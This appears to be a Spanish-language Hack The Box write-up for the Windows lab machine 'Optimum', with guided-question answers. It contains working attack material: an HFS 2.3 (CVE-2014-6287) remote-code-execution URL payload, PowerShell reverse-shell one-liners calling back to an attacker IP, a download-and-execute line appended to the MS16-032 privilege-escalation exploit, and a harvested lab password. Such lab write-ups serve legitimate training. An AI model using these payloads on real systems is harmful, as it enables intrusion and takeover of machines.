---
title: Writeup optimum - Hack The Box - Resolución y Análisis
published: true
tags:
  - hackthebox
  - writeup
  - optimum
  - ciberseguridad
  - pentesting
description: Writeup y resolución de la máquina optimum en Hack The Box.
keywords:
  - writeup optimum
  - hack the box optimum
  - resolución máquina optimum
  - optimum hack the box
  - htb optimum
---
-------------
### 🔗 Accesos rápidos

- 📄 **Writeup online**: [Link](https://publish.obsidian.md/bunzopy/HTB/Facil/Windows/Optimum)
- 📺 **Resolución en vivo (completa)**: [Parte1](https://www.youtube.com/watch?v=4ZEEfXjj5GY)|[Parte2](https://www.youtube.com/watch?v=LQ_cm_2EuHs)|[Parte3](https://www.youtube.com/watch?v=G8tLOBy31OE)|[Parte4](https://www.youtube.com/watch?v=aCJp-EArTMw)|[Parte5](https://www.youtube.com/watch?v=jzMU1UdUXio)|[Parte6](https://www.youtube.com/watch?v=25jKmbmAKqw)
- 🧠 **Explicación resumida**: 

---

#easy #windows #nmap #ping

----
# Guided Mode

1)¿Qué versión de HttpFileServer se está ejecutando en el puerto TCP 80?
	2.3

2)¿Cuál es el ID CVE de 2014 para una vulnerabilidad de ejecución remota de código en la función findMacroMarker de la versión 2.3 de HttpFileServer?
	[[CVE-2014-6287]]

3)¿Con qué usuario se ejecuta el servidor web? Indique el nombre de usuario sin el dominio.
	kostas

*La pregunta anterior era la flag de user.txt*
5)Pregunta opcional: ¿Cuál es la contraseña del usuario kostas?
	kdeEjDowkS*

6)¿Qué módulo de reconocimiento de Metasploit se puede utilizar para enumerar las posibles rutas de escalada de privilegios en un sistema comprometido?
	local_exploit_suggester


--------

# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

```shell
ping -c 1 10.10.10.8
nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn 10.10.10.8 -oG allPorts
nmap -sCV -p80 10.10.10.8 -oN target
```

![[Optimum1.png]]![[Optimum2.png]]
*TTL:* Maquina Windows
*Puertos:*
	`80` HTTP
*Datos importantes:*
	En el puerto 80 esta corriendo el servicio httpd 2.3

---------
# [[Whatweb-wappalyzer]] y [[Gobuster]]

```shell
whatweb http://10.10.10.8
```

![[Optimum3.png]]

![[Optimum4.png]]
Nos vuelve a informar que es un httpserver, como el escaneo de *NMAP*

-------
# Enumeracion y busqueda del [[CVE-2014-6287]]

Buscando en google *httpd 2.3 vulnerability* me encontre que se llama rejetto el nombre del software para compartir archivos a traves de http
![[Optimum5.png]]
Y recorde que haciendo click en esa parte de abajo a la derecha me mandaba a la pagina de https://www.rejetto.com/hfs/
![[Optimum6.png]]

-------------
# Explotacion [[CVE-2014-6287]] y [[Reverse shell]]

Vamos a crear un archivo reverse.ps1 con el siguiente payload. Esto lo sacamos de [payloadallthethings](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#powershell)

![[Optimum10.png]]
Vamos a usar el script de [nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1) para mandarnos la [[Reverse shell]]

```ps1
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```


Vamos a estar hosteando el archivo con un server de [[python3 -m http.server]] con el comando `python3 -m http.server 80` para que se descarge el archivo *reverse.ps1* con el cual vamos a inyectar el payload

![[Optimum9.png]]
Mientras estamos en escucha con [[rlwrap nc -lvnp 443]] 

Ejecutamos la vulnerabilidad mediante este link, solamente cambiando la ip desde la cual se va a descargar el archivo

`http://10.10.10.8/?search=%00{.exec|C%3a\Windows\System32\WindowsPowerShell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString(%27http%3a//10.10.16.12/reverse.ps1%27).}`

![[Optimum7 1.png]]
Ya estamos adentro de la maquina

-------
# Opcional Enumeracion con [[WinPEAS]] y contraseña del usuario kostas

Usamos el comando [[systeminfo]]
![[Optimum11.png]]
Esto lo vamos a poner en un archivo en nuestra maquina que se llame sysinfo.txt y lo vamos a crear con [[nvim]] usando el comando `nvim sysinfo.txt`
```
Host Name:                 OPTIMUM
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00252-70000-00000-AA535
Original Install Date:     18/3/2017, 1:51:36 ??
System Boot Time:          21/8/2025, 5:01:08 ??
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest
Total Physical Memory:     4.095 MB
Available Physical Memory: 3.424 MB
Virtual Memory: Max Size:  5.503 MB
Virtual Memory: Available: 4.810 MB
Virtual Memory: In Use:    693 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              \\OPTIMUM
Hotfix(s):                 31 Hotfix(s) Installed.
                           [01]: KB2959936
                           [02]: KB2896496
                           [03]: KB2919355
                           [04]: KB2920189
                           [05]: KB2928120
                           [06]: KB2931358
                           [07]: KB2931366
                           [08]: KB2933826
                           [09]: KB2938772
                           [10]: KB2949621
                           [11]: KB2954879
                           [12]: KB2958262
                           [13]: KB2958263
                           [14]: KB2961072
                           [15]: KB2965500
                           [16]: KB2966407
                           [17]: KB2967917
                           [18]: KB2971203
                           [19]: KB2971850
                           [20]: KB2973351
                           [21]: KB2973448
                           [22]: KB2975061
                           [23]: KB2976627
                           [24]: KB2977629
                           [25]: KB2981580
                           [26]: KB2987107
                           [27]: KB2989647
                           [28]: KB2998527
                           [29]: KB3000850
                           [30]: KB3003057
                           [31]: KB3014442
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.8
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

Y podemos ver que es un *Windows Server 2012 R2 Standard* de 64 bits

Vamos a hacernos un [[python3 -m http.server]] con el comando `python3 -m http.server 80` en el directorio que tengamos el [[WinPEAS]]

Luego desde la maquina victima vamos a descargarlo con [[wget]] usando el comando `wget http://10.10.16.15/winPEASx64.exe -outfile winPEASx64.exe` 
![[Optimum12.png]]
Para posteriormente ejecutarlo `./winPEASx64 > win` mandando el output a un archivo que se llame *win* una vez que pase un tiempo y termine el escaneo, vamos a abrir con [[type]] el archivo *win* con el comando `type win`

Y vemos estas credenciales de Autologon, asi que ya tenemos la contraseña del usuarios kostas
![[Optimum13.png]]
kostas:kdeEjDowkS*

-----------

# Enumeracion con [[Windows Exploit Suggester]]

[Repositorio que vamos a usar](https://github.com/GDSSecurity/Windows-Exploit-Suggester.git)
Lo descargamos con [[git clone]] usando el comando `git clone https://github.com/GDSSecurity/Windows-Exploit-Suggester.git`
Necesitamos instalar estos requerimientos con `pip install xlrd --upgrade`
Ahora tenemos que actualizar la base de datos con el comando `./windows-exploit-suggester.py --update`

Ejecutamos el exploit con `./windows-exploit-suggester.py --database 2025-08-14-mssb.xls --systeminfo sysinfo.txt`
![[Optimum16.png]]
Vemos que puede ser posible escalar privilegios con [[MS16-098]]

--------
# Escalada de privilegios con [[MS-16032]]

Vamos a descargar con [[wget]] con el comando `wget https://raw.githubusercontent.com/EmpireProject/Empire/refs/heads/master/data/module_source/privesc/Invoke-MS16032.ps1` [El exploit de empire](https://raw.githubusercontent.com/EmpireProject/Empire/refs/heads/master/data/module_source/privesc/Invoke-MS16032.ps1) y al final del exploit vamos a agregar la linea `Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.16.12/rev.ps1')"` para que se descargue y ejecute el archivo que va a enviarnos la [[Reverse shell]]

![[Optimum17.png]]

Ahora vamos a crear el archivo *rev.ps1* que seria lo mismo que el archivo *reverse.ps1* que usamos antes para ganar acceso a la maquina, pero ahora le vamos a cambiar el puerto ya que nos vamos a poner en escucha por el *5000*

```ps1
$client = New-Object System.Net.Sockets.TCPClient('10.10.16.12',5000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Mientras estamos en escucha con [[rlwrap nc -lvnp 443]] con el comando `rlwrap nc -nlvp 5000` y con un server [[python3 -m http.server]] con el comando `python3 -m http.server 80` hosteando todos los archivos

Vamos a ejecutar desde la maquina victima el comando [[Descargar archivos que procesos de 32 bits accedan a version de 64 bits system32]]

```
C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -ep bypass -c "iex (New-Object Net.WebClient).DownloadString('http://10.10.16.12/Invoke-MS16032.ps1')"
```

![[Optimum18.png]]

Ahora vamos a la pestaña que estamos en escucha en el puerto *5000* y ya estamos adentro y podemos catear la flag

![[Optimum19.png]]


-------
# Notas

Un servidor HTTP de archivos, también conocido como HFS (HTTP File Server), es una herramienta que permite a los usuarios compartir archivos a través de un protocolo HTTP



### Posible error
Si aparece este error cuando lo intentamos ejecutar, se puede solucionar instalando la siguiente libreria
![[Optimum14.png]]

Usamos el comando `pip2 install xlrd\==1.2.0` y ya con esto queda solucionado




Cuando ejecutamos el [[Windows Exploit Suggester]], 

![[Optimum16.png]]

Al principio nos muestra el MS16-135, pero entrando al exploit vemos que no soporta la version windows 2012 R2
![[Optimum15.png]]







-------
# Creditos
Nos ayudamos de [[searchsploit]] con el comando `searchsploit -m windows/webapps/49125.py` y vimos este exploit para guiarnos
[Writeup de 0xdf](https://0xdf.gitlab.io/2021/03/17/htb-optimum.html)
[Video Victor Garcia](https://www.youtube.com/watch?v=RPTQPuGRUk0)